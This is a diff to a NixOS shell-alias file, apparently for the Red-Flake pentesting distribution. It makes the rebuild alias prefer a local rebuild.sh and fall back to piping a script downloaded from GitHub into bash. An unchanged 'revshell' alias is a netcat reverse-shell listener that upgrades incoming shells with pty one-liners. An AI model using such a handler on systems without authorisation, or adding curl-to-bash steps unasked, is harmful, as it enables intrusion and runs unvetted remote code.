@@ -213,7 +213,15 @@
         fastfetch = "QT_QPA_PLATFORM=offscreen command fastfetch";
 
         # nixos
-        redflake-rebuild = "bash <(curl -L https://raw.githubusercontent.com/Red-Flake/red-flake-nix/main/rebuild.sh)";
+        redflake-rebuild = ''
+          if [ -f "$PWD/rebuild.sh" ] && [ -f "$PWD/flake.nix" ]; then
+            bash "$PWD/rebuild.sh"
+          elif [ -f "$HOME/Git/red-flake-nix/rebuild.sh" ] && [ -f "$HOME/Git/red-flake-nix/flake.nix" ]; then
+            bash "$HOME/Git/red-flake-nix/rebuild.sh"
+          else
+            bash <(curl -L https://raw.githubusercontent.com/Red-Flake/red-flake-nix/main/rebuild.sh)
+          fi
+        '';
 
         # custom reverse shell handler
         revshell = "echo -n 'Enter the port number: '; read port && stty raw -echo; (echo '/bin/python3 -c \"import pty;pty.spawn(\"/bin/bash\")\" || /bin/python -c \"import pty;pty.spawn(\"/bin/bash\")\" || /bin/python2 -c \"import pty;pty.spawn(\"/bin/bash\")\" || /bin/ruby -e \"exec \"/bin/bash\"\" || /bin/perl -e \"exec \"/bin/bash\";\" || /bin/lua -e \"require(\"os\");os.execute(\"/bin/bash\")\"'; echo 'stty'$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1); echo 'export TERM=xterm-256color'; echo 'export SHELL=/bin/bash'; echo reset; cat) | nc -lvnp \"$port\" && reset";
